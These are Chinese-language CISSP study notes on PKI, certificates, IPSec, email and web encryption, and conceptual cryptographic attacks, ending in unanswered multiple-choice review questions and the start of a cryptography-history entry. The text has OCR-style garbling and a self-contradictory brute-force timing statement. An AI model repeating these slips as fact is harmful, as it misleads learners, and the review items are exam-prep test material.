数字证书为通信双方提供了保证，保证正在与之通信的人确实具有他们所宣称的身份。数字证书本质上是个人公钥的认可副本。当用户验证证书确实是由可信证书颁发机构(CA)发布时，他们就相信这个公钥是合法的。数字证书包含特定的身份标识信息，并且其结构归国际标准X.509决定。遵循X.509标准的证书包含下列数据：</p><ul><li>证书遵循的X.509版本</li><li>序列号(来自证书建立者)</li><li>签名算法标识符(指定证书授权机构对证书的内容进行数字签名时使用的技术)</li><li>发布者姓名(发布证书的证书授权机构的身份标识)</li><li>有效期(指定证书有效的日期和时间：开始的日期、时间，以及结束的日期、时间)</li><li>主体的名字(包括区分实体身份的唯一名字或DN，相应实体拥有证书中包含的公钥)</li><li>主体的公钥(证书的内容：证书拥有者用于建立安全通信的实际公钥)</li></ul><h4 id="7-4-2-证书授权机构"><a href="#7-4-2-证书授权机构" class="headerlink" title="7.4.2 证书授权机构"></a>7.4.2 证书授权机构</h4><p>　　证书授权机构(CA)将公钥基础设施绑定在一起。这些中立的组织机构为数字证书提供公证服务。为了从著名的CA处获得数字证书，必须亲自前往其代理机构，并且出示适当的身份识别文档。下面的列表中包括一些主要的CA：</p><ul><li>Symantec</li><li>Thawte</li><li>GeoTrust</li><li>GlobalSign</li><li>Comodo Limited</li><li>Starfield Technologies</li><li>GoDaddy</li><li>DigiCert</li><li>Network Solutions. LLC</li><li>Entrust</li></ul><p>　　注册授权机构(RA)在数字证书发布之前帮助CA验证用户的身份。队本身并不直接发布证书，但是在认证过程中扮演重要的角色，从而允许CA远程验证用户的身份。</p><h4 id="7-4-3-证书的生成与撤消"><a href="#7-4-3-证书的生成与撤消" class="headerlink" title="7.4.3 证书的生成与撤消"></a>7.4.3 证书的生成与撤消</h4><h5 id="1-注册"><a href="#1-注册" class="headerlink" title="1. 注册"></a>1. 注册</h5><p>　　当希望获得一个数字证书时，你必须首先采用某种方式向证书授权机构证明身份，这个过程被称为注册。</p><h5 id="2-验证"><a href="#2-验证" class="headerlink" title="2. 验证"></a>2. 验证</h5><p>　　当收到来自希望与之通信的人的数字证书时，就需要通过使用CA的公钥检查CA的数字签名来验证这个证书。接着，必须检查并确保证书并没有公布在证书撤消列表(Certificate Revocation List，CRL)中。此时，假如满足下列要求，那么就可以认定在证书中列出的公钥是可信的：</p><ul><li>CA的数字签名是可信的</li><li>你信任CA</li><li>证书没有被列在CRL中</li><li>证书实际上包含你信任的数据</li></ul><h5 id="3-撤消"><a href="#3-撤消" class="headerlink" title="3. 撤消"></a>3. 撤消</h5><p>　　有时，证书授权机构会由于下列某种原因需要撤消证书：</p><ul><li>证书遭到破坏(例如，证书所有者不慎丢失了私钥)</li><li>证书被错误地发放(例如，CA错误地发放了一个没有进行正确验证的证书)</li><li>证书的细节发生变化(例如，主体的名字发生了变化)</li><li>安全性关联发生变化(例如，担保这份证书的组织机构不再雇用主体)</li></ul><p>　　可以使用下列两种技术来验证证书的可靠性以及确定撤消的证书：</p><ul><li><strong>证书撤消列表</strong> 证书撤消列表(CRL)由不同的证书授权机构进行维护，并且包含CA发布的己被撤消的证书的序列号以及撤消生效的日期和时间。证书撤消列表的主要缺点是它们必须定期下载并交叉参照，这样就会在证书被撤消和通知最终用户证书撤消之间存在一段时间延迟。然而，CRL仍然是今天检查证书状况的最常见方法。</li><li><strong>联机证书状态协议(Online Certificate Status Protocol，OCSP)</strong> 这个协议通过提供实时证书验证方法消除了认证撤消列表所带来的固有延迟。当客户端收到一份证书时，就会向CA的OCSP服务器发送OCSP请求。服务器随后回应这份证书的状态(有效、无效或未知) 。</li></ul><h4 id="7-4-4-非对称密钥的管理"><a href="#7-4-4-非对称密钥的管理" class="headerlink" title="7.4.4 非对称密钥的管理"></a>7.4.4 非对称密钥的管理</h4><ul><li><p>明智地选择加密系统<br>选择算法公开的加密系统，其算法必须经过行业专家的彻底检查。慎重选择使用”黑箱”途径的加密系统和维护算法的秘密性，这对于密码系统的完整性来说至关重要。</p></li><li><p>以适当的方式选择密钥<br>选择密钥长度时应当考虑、安全需求与性能之间的平衡。此外，应当确认密钥真正随机。密钥内的任何模式都会增加攻击者破译加密和减弱密码系统安全性的可能性。</p></li><li><p>使用公钥加密时，一定要保证私钥的机密性<br>在任何情况下都不能允许其他人获知你的私钥。需要记住的是，偶尔允许某人访问私钥，会持久地危害使用该密钥加密的所有通信(无论是过去、当前还是将来)，并且准许第三方能够成功地进行假冒。</p></li><li><p>密钥在服务一段时期后应当停止使用<br>许多组织机构具有强制的密码轮换需求，从而防止未被发现的密钥泄露。如果没有必须遵循的正式策略，那么可以基于密钥的使用频率选择适当的密钥轮换时间间隔。如果可能的话，可以几个月更改一次密钥对。</p></li><li><p>备份密钥<br>如果由于数据损坏、崩溃或其他情况丢失包含私钥的文件，那么无疑希望具有可用的备份。此时，既可以创建自己的备份，也可以使用维护备份的密钥托管服务。在任何情况下，都需要确保以安全的方式处理备份。毕竟，备份与主密钥文件一样重要!</p></li></ul><h3 id="7-5-密码学的应用"><a href="#7-5-密码学的应用" class="headerlink" title="7.5 密码学的应用"></a>7.5 密码学的应用</h3><h4 id="7-5-1-便携式设备"><a href="#7-5-1-便携式设备" class="headerlink" title="7.5.1 便携式设备"></a>7.5.1 便携式设备</h4><p>　　许多组织转向加密来保护这些设备上的数据，以防止它们被错误放置和使用。目前流行的操作系统版本都包括磁盘加密功能，使其便于应用和管理便携式设备上的数据加密。各种各样的商业工具可以提供额外的功能和管理能力。这些工具之间的主要区别在于它们是如何保护存储在内存中的密钥的，它们是否提供完整的磁盘或卷加密，以及是否将与基于硬件的可信平台模块(frusted Platform Module，TPM)进行集成并提供附加的安全性。选择加密软件的任何努力都应该包括对这些特性的分析。</p><h4 id="7-5-2-电子邮件"><a href="#7-5-2-电子邮件" class="headerlink" title="7.5.2 电子邮件"></a>7.5.2 电子邮件</h4><p>　　对于电子邮件来说，简明就是成本效益最高的选项，不过有时密码学提供了无法避免使用的特定安全服务。因为保护安全也具有成本效益，所以加密电子邮件需要遵守下列规则：</p><ul><li>如果在发送邮件时需要实现机密性，那么就加密邮件。</li><li>如果需要维护邮件的完整性，那么就必须对邮件进行散列运算。</li><li>如果需要实现身份认证和完整性，那么就应当对邮件进行数字化签名。</li><li>如果需要实现机密性、完整性、身份认证和不可否认性，那么就应当对邮件进行加密和数字化签名。</li></ul><p>　　目前广泛使用的一些电子邮件标准：</p><ul><li><p>可靠隐私(PGP)<br>PGP有两个可用的版本。商业版本使用RSA进行密钥交换，使用IDEA进行加密/解密，使用MD5生成消息摘要。免费版本则使用Diffie-Helhnan密钥交换、Carlisle Adams/Stafford Tavares(CAST)128位的加密/解密算法以及SHA-1散列函数。</p></li><li><p>安全多用途互联网邮件扩展协议(S/MIME)<br>S/MIME使用RSA加密算法，并且己经得到包括RSA安全公司在内的业界主要机构的支持。S/MIME依靠X.509证书交换密码系统密钥。这些证书包含的公钥被用于数字签名和较长通信会话中使用的对称密钥交换。RSA是SIMIME支持的唯一一个公钥密码学协议，这个协议支持AES和3DES 对称加密算法。</p></li></ul><h4 id="7-5-3-Web-应用"><a href="#7-5-3-Web-应用" class="headerlink" title="7.5.3 Web 应用"></a>7.5.3 Web 应用</h4><p>　　SSL协议由Netscape公司开发，提供对客户机/服务器之间的网站流量进行加密的服务。安全套接字层上的超文本传输协议(HTTPS)使用443端口在Web服务器和客户端浏览器之间协商加密通信会话。SSL依赖在浏览器与Web服务器之间交换数字证书以协商加密/解密参数。SSL协议的目标是建立安全的通信通道，使整个Web浏览器会话保持开放。它取决于对称和非对称加密的组合。具体过程涉及以下步骤：</p><ul><li>(1) 当用户访问一个网站时，浏览器检索Web服务器的证书，并从中提取服务器的公共密钥。</li><li>(2) 然后，浏览器创建一个随机的对称密钥，使用服务器的公钥来加密，然后将加密的对称密钥发送到服务器上。</li><li>(3) 随后，服务器使用自己的私钥解密对称密钥，这两个系统使用对称加密密钥来交换未来的交互信息。</li></ul><p>　　隐写术(steganography)是使用密码学技术在另一条消息内嵌入秘密泊’息的方法。这种算法是通过修改组成图像文件的数据中最不重要的数据位进行工作的。变化非常微小，以至于对图像的浏览没有明显的影响。这种技术允许通信双方以简单的方式隐藏消息，例如在其他人毫无察觉的情况下，在Web页面的插图里嵌入秘密的消息。</p><h4 id="7-5-4-数字版权管理-DRM"><a href="#7-5-4-数字版权管理-DRM" class="headerlink" title="7.5.4 数字版权管理(DRM)"></a>7.5.4 数字版权管理(DRM)</h4><p>　　数字版权管理(Digital Rights Management，DRM)软件使用加密来加强对数字媒体版权的限制。使用场景有：</p><ul><li>音乐DRM</li><li>电影DRM</li><li>电子书DRM</li><li>视频游戏DRM</li><li>文档DRM</li></ul><h4 id="7-5-5-网络连接"><a href="#7-5-5-网络连接" class="headerlink" title="7.5.5 网络连接"></a>7.5.5 网络连接</h4><h5 id="1-链路加密"><a href="#1-链路加密" class="headerlink" title="1. 链路加密"></a>1. 链路加密</h5><p>　　安全管理人员使用两种类型的加密技术来保护在网络上传输的数据的安全：</p><ul><li>链路加密使用软件或硬件解决方案在两个点之间建立一条安全隧道，对进入隧道一端的所有通信数据都进行加密，并且对流出隧道另一端的所有通信数据都进行解密，从而保护整条通信线路的安全。例如，某公司通过一条数据线连接两个办公室，可以使用链路加密技术来防止攻击者在两个办公室之间的某一点进行的监控活动。</li><li>端到端加密用于保护双方仰的日，客户端和服务器)之间的通信安全，并且可以独立于链路加密实施。在发送者和接收者之间传递使用PGP的邮件，就是端到端加密的例子。这种技术可以阻止入侵者监控加密链路安全端的传输数据或者通过未加密链路传送的数据。</li></ul><p>　　链路加密和端到端加密技术之间的关键差异在于： 在链路加密中，所有的数据(包括头、尾、地址和路由数据)也会被加密，因此每个数据包必须在每一跳(each hop)都被解密，这样数据包才能被正确地路由至下一跳，然后数据包在继续发送之前又被重新加密，这就降低了路由的速度。端到端加密技术不加密头、尾、地址和路由数据，因此数据包从一点移到另一点的速度加快了，但是这种技术更容易遭到嗅探器和偷听者的攻击。当加密发生在OSI模型的较高层时，通常会使用端到端加密技术; 如果加密发生在OSI模型的较低层，通常会使用链路加密技术。</p><h5 id="2-IPSec"><a href="#2-IPSec" class="headerlink" title="2. IPSec"></a>2. IPSec</h5><p>　　网络协议安全(IPSec)标准就是这样一种支持安全通信的体系结构。IPSec是由互联网工程任务组(IETF)确立的标准体系结构，并且能够在两个实体之间建立信息交换的安全信道。IPSec通过公钥密码学来提供加密、访问控制、不可否认性以及消息身份认证，井且一般使用IP协议。IPSec主要被用于虚拟专用网(VPN)，因此可以工作在运输模式或隧道模式中。IPSec通常与二层隧道协议(L2TP)在一起，成为L2TP/IPSec。IPSec协议为安全网络通信提供了完整的基础设施。IPSec已经得到广泛认可，并且现在许多商业性的操作系统中也提供了这个协议。IPSec依赖于安全关联，井且存在下列两个主要组件：</p><ul><li>身份验证头(Authentication Header，AH)提供消息完整性和不可否认性的保证。AH还提供身份认证和访问控制，并且可以防止重放攻击。</li><li>安全封装有效载荷(Encapsulating Security Payload，ESP)提供数据包内容的机密性和完整性。ESP还提供加密和有限的身份认证，并且可以防止重放攻击。</li></ul><p>　　在运行时，通过创建安全关联(Security Association，SA)来建立IPSec会话。SA表示通信会话，井且记录与特定连接有关的任何配置和状态信息。SA表示单一连接。如果期望双向信道，那么就需要两个SA，每个方向分别使用一个SA。此外，如果希望支持使用AH和ESP的双向信道，那么就需要建立4个SA。</p><h5 id="3-ISAKMP"><a href="#3-ISAKMP" class="headerlink" title="3. ISAKMP"></a>3. ISAKMP</h5><p>　　网络安全关联密钥管理协议(ISAKMP)通过协商、建立、修改和删除安全关联为IPSec提供后台的安全支持服务。正如你在前面一节中学到的那样，IPSec依赖于安全关联的系统。这些安全关联通过使用ISAKMP进行管理。正如在Intemet RFC 2408中阐述的一样，ISAKMP具有下列4个基本要求：</p><ul><li>对通信对等方进行身份认证</li><li>建立并管理安全关联</li><li>提供密钥生成机制</li><li>防止遭受威胁(例如，重放和拒绝服务攻击)</li></ul><h5 id="4-无线互联"><a href="#4-无线互联" class="headerlink" title="4. 无线互联"></a>4. 无线互联</h5><ul><li><strong>有线等价隐私</strong> 安全团体最初通过引入有线等价隐私队Tired Equivalent Privacy，WEP)提供64和128位的加密边工页，从而保护无线LAN内的通信。IEEE 802.11中将WEP描述为无线网络连接标准的一个可选组件。</li><li><strong>WiFi安全访问</strong> 通过实现临时密钥完整性协议(Temporal Key Integrity Protocol，TKIP)并消除危害WEP的密码学弱点，WPA(WiFi Protected Access)改进了WEP加密。通过将TKIP替换为AES加密算法，WPA2进一步改善了WPA技术。这两种技术都是适合现代无线网络使用的安全算法。</li></ul><p>　　IEEE 802.1x是另一种常用的无线安全标准，它为有线和无线网络中的身份认证和密钥管理提供了灵活的架构。为了使用802.1x，客户端需要运行被称为supplicant的软件。supplicant软件与身份认证服务器进行通信。成功进行身份认证之后，网络交换机或无线接入点就允许客户端访问无线网络。WPA被设计为与802.1x身份认证服务器进行交互。</p><h3 id="7-6-密码学攻击"><a href="#7-6-密码学攻击" class="headerlink" title="7.6 密码学攻击"></a>7.6 密码学攻击</h3><ul><li><strong>分析攻击</strong> 这是一种试图降低算法复杂性的代数运算。分析攻击关注于算法本身的逻辑性。</li><li><strong>实现攻击</strong> 这种攻击类型利用密码学系统的实现中的弱点，关注于对软件代码的利用，不仅仅涉及错误与缺陷，而且还涉及编写加密系统程序所使用的方法。</li><li><strong>统计攻击</strong> 统计攻击利用密码系统中的统计弱点，例如无法生成随机数和浮点错误。统计攻击试图发现驻留密码学应用程序的硬件或操作系统中的漏洞。</li><li><strong>蛮力攻击</strong> 蛮力攻击十分简单。这种攻击尝试每种可能的、有效的密钥或密码组合。蛮力攻击涉及使用大规模的处理能力，对保护通信安全的密钥进行有系统的猜测。针对没有缺点的协议，通过蛮力攻击发现密钥所需的平均时间与密钥的长度成正比。如果具有足够的时间，蛮力攻击总是会成功。密钥长度每增加一位，由于潜在的密钥数加倍，因此执行蛮力攻击的时间也会加倍。有两种方法可使攻击者提升蛮力攻击的效果：<ul><li>彩虹表提供预先计算的密码散列值，这些通常用于破解以密码散列方式存储的系统中的密码。</li><li>专为蛮力攻击设计和开发的专业化的、可扩展的计算硬件将大大提高这种攻击方法的效率。</li></ul></li><li><strong>频率分析和仅知密文攻击</strong> 在许多情况下，你唯一拥有的信息是加密后的密文信息，即所谓的仅知密文攻击。在这种情况下，频率分析就是一种己证明可行的对抗简单密码的技术。它计算每个字母出现在密文中的次数。使用你掌握的知识，宇母E、T、0、A、I和N是最常见的英语字母，可以测试几个假设：<ul><li>如果这些字母在密文中最常见，这个密码可能是移位密码，只是重新排列明文字符但不改变它们。</li><li>如果其他字母在密文中最常见，密码可能是某种形式的置换密码并代替明文字符。这是对频率分析的简单概述，这个技术的众多复杂的变种可以用来对付多表密码和其他复杂的密码。</li></ul></li><li><strong>已知明文攻击</strong> 在己知明文攻击中，攻击者具有己加密消息的副本以及用于产生密文(副本)的明文消息。知道了这些消息，可以极大地帮助攻击者破解较弱的编码。</li><li><strong>选定密文攻击</strong> 在选定密文攻击中，攻击者能够解密所选的部分密文消息，并且可以使用己解密的那部分消息来发现密钥。</li><li><strong>选定明文攻击</strong> 在选定明文攻击中，攻击者能够加密所选的明文消息，随后可以分析加密算法输出的密文。</li><li><strong>中间相遇攻击</strong> 攻击者可以使用中间相遇攻击击败使用两轮加密的加密算法。这种攻击导致双重DES(2DES)很快被抛弃，并且转而使用三重DES(3DES)这种增强的DES 加密技术。在中间相遇攻击中，攻击者使用己知的明文消息。然后，使用每一种可能的密钥(kl)加密明文，同时使用所有可能的密钥(k2)解密相当的密文。当发现存在匹配时，相应的密钥对(kl，k2)就代表了双重加密的两个部分。这种类型的攻击通常只需花费破解一轮加密算法(或2n，而不是预计的2n* 2n)所需时间的两倍，一轮加密算法提供了最小强度的附加保护措施。</li><li><strong>中间人攻击</strong> 在中间人攻击中，怀有恶意的人置身于通信双方之间的位置并截获所有的通信(包括密码学会话的设置)。攻击者对始发者的初始化请求做出响应，井且建立与始发者的安全会话。然后，攻击者伪装成始发者，使用不同的密钥与预期的接收者建立另一个安全会话。这样一来，攻击者就能够”坐在”通信双方的中间，读取流经的所有数据流。</li><li><strong>生日攻击</strong> 生日攻击也被称为冲突攻击或逆向散列匹配，它能够寻找散列函数一一对应特性中的缺陷。在这种攻击中，怀有恶意的人在数字化签名的通信中寻找可以生成相同消息摘要的不同消息，从而维持原有数字签名的有效性。</li><li><strong>重放攻击</strong> 重放攻击被用于对付那些没有结合临时保护措施的加密算法。在这种攻击中，怀有恶意的人拦截通信双方之间的加密消息(通常是身份认证的请求)，然后”重放”捕获的信息以打开新的会话。通过在每条消息中结合时间标记和过期时间，就可以防御这种攻击。</li></ul><h3 id="7-7考试要点"><a href="#7-7考试要点" class="headerlink" title="7.7考试要点"></a>7.7考试要点</h3><ul><li><strong>理解在非对称密码系统中使用的密钥类型</strong> 公钥在通信参与者之间是自由共享的，而私钥是要求保密的。为了加密消息，应当使用接收方的公钥。为了解密消息，应当使用自己的私钥。为了签名信息，也应当使用自己的私钥。为了验证签名，应当使用发送者的公钥。</li><li><strong>熟悉三种主要的公钥密码系统</strong> 1977年，由阳vest、Shamir和Adleman开发的RSA 是最著名的公钥密码系统，依赖于对质数乘积进行因数分解的难度。El Gamal是Diffie-Hellman密钥交换算法的扩展，依赖于模运算。椭圆曲线加密算法依赖于椭圆曲线离散对数问题，在密钥的长度相同时，能提供比其他算法更高的安全性。</li><li><strong>知道散列函数的基本要求</strong> 优秀的散列函数具有5 个要求： 它们必须允许任意长度的输入值，提供固定长度的输出值，使得计算任意输入值的散列函数相对简单，提供单向功能并且是无冲突的。</li><li><strong>熟悉4种主要的散列算法</strong> 安全散列算法(SHA)的后继算法SHA-l和SHA-2构成了政府标准的消息摘要函数。SHA-l生成160位的消息摘要，SHA-2支持最大512位的可变长度的消息摘要，SHA-3还在开发制定中，而NIST 稍晚些将发布最终版本。</li><li><strong>知道密码加盐如何提高密码散列的安全性</strong> 当直接使用在密码文件中散列存储的密码时，攻击者可能利用预先计算值的彩虹表来识别常用的密码。在散列之前将盐添加到密码中，降低了彩虹表攻击的有效性。</li><li><strong>理解如何产生和验证数字签名</strong> 为了数字化签名消息，首先要使用散列函数生成消息摘要。然后，用自己的私钥加密消息摘要。为了验证消息中的数字签名，需要使用发送者的公钥解密签名，随后将解密得到的消息摘要与自己产生的消息摘要进行比较。如果二者匹配，那就说明接收的消息是可信的。</li><li><strong>了解数字签名标准(DSS)的组件</strong> 数字签名标准使用SHA-l和SHA-2消息摘要函数和下列三种加密算法中的一种： 数字签名算法(DSA) 、RSA算法或椭圆曲线数字签名算法(ECDSA)。</li><li><strong>理解公钥基础设施(PKI )</strong> 在公钥基础设施中，证书授权机构(CA)生成包含系统用户的公钥的数字证书。然后，用户把这些证书分发给希望进行通信的人。证书接收方会使用CA的公钥来验证证书。</li><li><strong>了解常见的保护电子邮件安全的密码学应用</strong> 用于被加密消息的新兴标准是S/MIME协议。其他流行的电子邮件安全协议包括Phil Zimmerman的可靠隐私(PGP)。电子邮件加密的大多数用户依赖于将这项技术构建到他们的电子邮件客户端或他们的基于Web的电子邮件服务。</li><li><strong>了解常见的保护Web 活动安全的密码学应用</strong> 安全Web通信的事实标准是使用安全传输层协议(TLS)或旧的安全套接字层(SSL)上的HTTP。大多数的网络浏览器都支持这两种标准。</li><li><strong>了解常见的保护网络连接安全的密码学应用</strong> IPSec协议标准提供了加密网络通信的通用架构，并且被内建在许多常见的操作系统中。IPSec的运输模式针对对等通信方式加密数据包的内容，隧道模式则针对网关间的通信方式加密整个数据包(包括头信息)。</li><li><strong>能够描述IPseco IPSec是一种在IP上支持安全通信的安全体系架构</strong> IPSec来用运输模式或隧道模式建立安全的信道。它既可以被用于在计算机之间建立直接的通信，也可以被用于在网络之间建立VPN。IPSec使用两个协议： 身份验证头(AH)和封装安全有效载荷(ESP) 。</li><li><strong>解释常见的密码学攻击类型</strong> 穷举攻击(又称蛮力攻击)试图通过随机的组合找到正确的加密密钥。己知明文攻击、选定密文攻击和选定明文攻击都要求攻击者具有除了密文以外的其他一些信息。中间相遇攻击利用了使用两轮加密的协议。中间人攻击是欺骗通信双方与攻击者进行通信，而不是通信双方彼此之间直接通信。生日攻击尝试找到散列函数中的冲突。重放攻击则企图重用身份认证请求。</li><li><strong>了解数字版权管理(DRM)的用途</strong> 数字版权管理(DRM)解决方案允许内容所有者执行对内容的使用限制。DRM解决方案通常保护娱乐内容，如音乐、电影和电子书，但偶尔也可见于企业中，用于保护文档中存储的敏感信息。</li></ul><h3 id="7-8-复习题"><a href="#7-8-复习题" class="headerlink" title="7.8 复习题"></a>7.8 复习题</h3><ol><li><p>在RSA公钥密码系统中，下列哪个数字总是最大?<br>A. e<br>B. n<br>C. p<br>D. q</p></li><li><p>El Gamal密码体系的基础是什么加密算法形式?<br>A. RSA<br>B. Diffie-Hellman<br>C. 3DES<br>D. IDEA</p></li><li><p>如果Richard要发送一条用公钥密码系统加密过的消息给Sue，他用哪个密钥加密这条消息?<br>A. Richard 的公钥<br>B. Richard 的私钥<br>C. Sue 的公钥<br>D. Sue 的私钥</p></li><li><p>如果用El Gamal公钥密码系统加密一条2048位的明文消息，产生的密文信息有多长?<br>A. 1024 位<br>B. 2048 位<br>C. 4096 位<br>D. 8192 位</p></li><li><p>Acme Widgets目前在全公司范围内使用1024位的RSA加密标准。该公司计划从RSA转换成椭圆曲线加密系统。如果要保持相同的加密强度，应该使用多长的ECC密钥?<br>A. 160 位<br>B. 512 位<br>C. 1024 位<br>D. 2048 位</p></li><li><p>John 想要产生2048位的消息摘要，并计划发送给Mary。如果他使用SHA-l散列算法，这条特定消息的消息摘要的长度是多少?<br>A. 160 位<br>B. 512 位<br>C. 1024 位<br>D. 2048 位</p></li><li><p>下列哪个技术被认为是有缺陷的并且不应该再被使用?<br>A. SHA-2<br>B. PGP<br>C. WEP<br>D. TLS</p></li><li><p>WPA使用什么加密技术保护无线通信?<br>A. TKIP<br>B. DES<br>C. 3DES<br>D. AES</p></li><li><p>Richard收到Sue发送给他的加密消息。他应该用什么密钥来解密消息?<br>A . Richard 的公钥<br>B. Richard 的私钥<br>C. Sue 的公钥<br>D. Sue 的私钥</p></li><li><p>Richard想要对正在发送给Sue的消息进行数字签名，以便于Sue能够确认这条消息来自于他，没有在传输过程中被篡改。他应该使用什么密钥来加密这条摘要消息?<br>A. Richard 的公钥<br>B. Richard 的私钥<br>C. Sue 的公钥<br>D. Sue 的私钥</p></li><li><p>下列哪个算法不受数字签名标准支持?<br>A. 数字签名算法<br>B. RSA<br>C. El Gamal DSA<br>D. Elliptic Curve DSA</p></li><li><p>哪个国际电信联盟(ITU)标准用于管理安全电子通信中的数字证书的创建和支持?<br>A. X.500<br>B. X.509<br>C. X.900<br>D. X.905</p></li><li><p>什么密码系统为商业版的Phil Zimmerman的PGP(可靠隐私)安全邮件系统提供加密/解密技术?<br>A. ROT13<br>B. IDEA<br>C. ECC<br>D. El Gamal</p></li><li><p>什么TCP/IP通信端口被TLS通信所使用?<br>A. 80<br>B. 220<br>C. 443<br>D. 559</p></li><li><p>什么类型的密码攻击提出了双重DES(2DES)不比标准的DES加密有效?<br>A. 生日攻击<br>B. 选定明文攻击<br>C. 中间相遇攻击<br>D. 中间人攻击</p></li><li><p>以下哪些工具可以用来提高暴力破解攻击的有效性?<br>A. 彩虹表<br>B. 分级审查<br>C. TKIP<br>D. 随机增强</p></li><li><p>以下哪个链接会被WPA加密进行保护?<br>A. 防火墙到防火墙<br>B. 路由器到防火墙<br>C. 客户端到无线接入点<br>D. 无线接入点到路由器</p></li><li><p>使用证书撤销列表的主要缺点是什么?<br>A. 密钥管理<br>B. 延迟<br>c. 记录保留<br>D. 暴力攻击的漏洞</p></li><li><p>下列加密算法中的哪一个现在被认为是不安全的?<br>A. El Gamal<br>B. RSA<br>C. Skipjack<br>D. Merkle-Hellman Knapsack</p></li><li><p>IPSec 定义了什么?<br>A. 针对特定配置的所有可能的安全分类<br>B. 一个用于建立安全通信通道的框架<br>C. Biba模型中的有效过渡状态<br>D. TCSEC安全类别</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中PKI和密码学应用章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（6）——密码学与对称加密算法</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%8E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（6）——密码学与对称加密算法/</id>
    <published>2018-09-13T08:41:19.000Z</published>
    <updated>2018-10-11T10:12:52.882Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全工程</p><ul><li>I. 应用加密学<ul><li>I.1 密码学生命周期(例如，密码学的局限性、算法/协议的管理)</li><li>I.2 密码学的种类(对称密码学、非对称密码学、椭圆曲线密码学)</li><li>I.7 不可否认性</li><li>I.8 完整性(哈希和撤盐)</li></ul></li></ul><h3 id="6-1-密码学历史上的里程碑"><a href="#6-1-密码学历史上的里程碑" class="headerlink" title="6.1 密码学历史上的里程碑"></a>6.1 密码学历史上的里程碑</h3><p>　　伴随着人类通信的发展，为了对那些局外人隐藏通信的真正含义，保密的方法应运而生。古人类社会使有复杂的秘密符号系统代表战争中安全的地方。现代文明社会使用多种代码和密码促进个人和组织之间的私人通信。</p><h4 id="6-1-1-凯撒密码"><a href="#6-1-1-凯撒密码" class="headerlink" title="6.1.1 凯撒密码"></a>6.1.1 凯撒密码</h4><p>　　凯撒密码简单地将字母表中的每个字母都替换为其后的第三个字母。这是单一字母的替代置换密码，也被称C3密码。</p><h4 id="6-1-2-美国内战"><a href="#6-1-2-美国内战" class="headerlink" title="6.1.2 美国内战"></a>6.1.2 美国内战</h4><p>　　在美国内战期间，由于北部联邦和南部联邦的支持者都通过窃听对方的电报线路来刺探情报，因此双方对前线的安全通信都使用了相对先进的密码系统。这些系统使用词汇替代和置换(详细内容参看”密码”部分)的复杂组合，从而试图破坏敌人的破译企图。在内战中广泛使用的另一个系统是由军医Albert J.Myer开发的一系列标记符号。</p><h4 id="6-1-3-Ultra-与Enigma"><a href="#6-1-3-Ultra-与Enigma" class="headerlink" title="6.1.3 Ultra 与Enigma"></a>6.1.3 Ultra 与Enigma</h4><p>　　德国军事产业复合体为了官方使用而改造了一种名为Enigma的商业编码机。它使用一系列3到6个转子实现了一种极复杂的替换密码。使用同时代的技术对加密消息进行破译的唯一可行方法是使用类似的机器，这些机器应当具有与传输设备使用的相同转子设置。<br>　　同盟国军方开始了一项代号为川剧的绝密工作，其目的是对Enigma编码进行攻击。最终，当波兰军方成功地复原了一台Enigma原型机并且与英国和美国的密码术专家共享了他们的成果时，他们的努力得到了回报。同盟国在1940年成功地破解了Enigma编码，历史学家相信这次成功为最终战胜轴心国起到了重要的作用。<br>　　日本人在第二次世界大战期间使用了类似的一台机器，被称为Japanese Purple Machine。美国人对这个密码系统的攻击效果显著，导致日本人的密码在战争结束前就己被破解。</p><h3 id="6-2-密码学基础"><a href="#6-2-密码学基础" class="headerlink" title="6.2 密码学基础"></a>6.2 密码学基础</h3><h4 id="6-2-1-密码学的目标"><a href="#6-2-1-密码学的目标" class="headerlink" title="6.2.1 密码学的目标"></a>6.2.1 密码学的目标</h4><p>　　安全从业人员利用密码系统达到下列4个基本目标： 机密性、完整性、身份认证和不可否认性。实现每个目标都需要满足很多设计需求，并且不是所有的加密系统都要达到所有4个目标。</p><h5 id="1-机密性"><a href="#1-机密性" class="headerlink" title="1. 机密性"></a>1. 机密性</h5><p>　　机密性确保数据在存储中(例如，存储在磁盘上)或在传输中(例如，在两方或多方之间传递)保持秘密状态。强制实施机<br>密性的密码系统主要有两种类型： 对称密钥密码系统使密码系统中的所有用户都能够使用一个共享的密钥，公钥密码系统使系统中的每个用户都能够使用公钥和私钥的单独组合。<br>当开发以提供保密为目的的加密系统时，你必须考虑两种不同类型的数据：</p><ul><li>静态数据或存储数据，是指数据保存在固定和等待接入的位置。静态数据的例子包括存储在硬盘、磁带备份、云存储服务、USB设备和其他存储介质上的数据。</li><li>运动中的数据或线缆上的数据，是指在两个系统之间通过网络传输的数据。运动中的数据可能在企业网络、无线网络或公共互联网上进行传输。</li></ul><h5 id="2-完整性"><a href="#2-完整性" class="headerlink" title="2. 完整性"></a>2. 完整性</h5><p>　　完整性确保数据在传输的过程中不会被修改。完整性检查能确保存储的数据在创建和被访问期间不会遭受篡改。这样做可以防止所有形式的修改： 第三方企图插入错误信息的有意修改以及因传输过程中的错误导致的无意修改。消息完整性通过使用在传输消息时创建的数字签名消息摘要来强制实施。消息的接收者简单地对消息摘要和签名的有效性进行验证，确保消息未在传输过程中修改。公共和私钥密码系统都能够强制实施完整性。</p><h5 id="3-身份认证"><a href="#3-身份认证" class="headerlink" title="3. 身份认证"></a>3. 身份认证</h5><p>　　身份认证对声明的系统用户身份进行验证，并且是密码系统的主要功能。</p><h5 id="4-不可否认性"><a href="#4-不可否认性" class="headerlink" title="4. 不可否认性"></a>4. 不可否认性</h5><p>　　